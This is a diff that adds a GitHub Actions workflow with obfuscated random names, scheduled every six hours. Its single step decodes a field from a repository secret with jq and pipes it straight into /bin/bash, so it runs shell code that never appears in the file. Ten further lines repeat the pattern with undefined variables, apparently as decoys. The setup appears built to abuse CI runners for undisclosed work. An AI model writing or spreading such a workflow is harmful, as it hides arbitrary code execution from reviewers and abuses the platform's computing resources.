@@ -1,0 +1,27 @@
+name: zhouyiri2245
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '14 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhouyiri2245
+        env:
+          xxqr5504: ${{ secrets.xxqr5504 }}
+        run: |
+          echo $xxqr5504 | jq -r .sx1694 | /bin/bash
+          echo $zut7224 | jq -r .wbmu4 | /bin/bash
+          echo $jgax3 | jq -r .gydry366 | /bin/bash
+          echo $vdbwx55062 | jq -r .yctd69 | /bin/bash
+          echo $r8 | jq -r .g800 | /bin/bash
+          echo $hcb6 | jq -r .yp0429 | /bin/bash
+          echo $msp8638 | jq -r .u4 | /bin/bash
+          echo $xfi99 | jq -r .jxzo215 | /bin/bash
+          echo $w6476 | jq -r .itqah2 | /bin/bash
+          echo $ufds8847 | jq -r .oapmk74 | /bin/bash
+          echo $xq918 | jq -r .hl5004 | /bin/bash
+
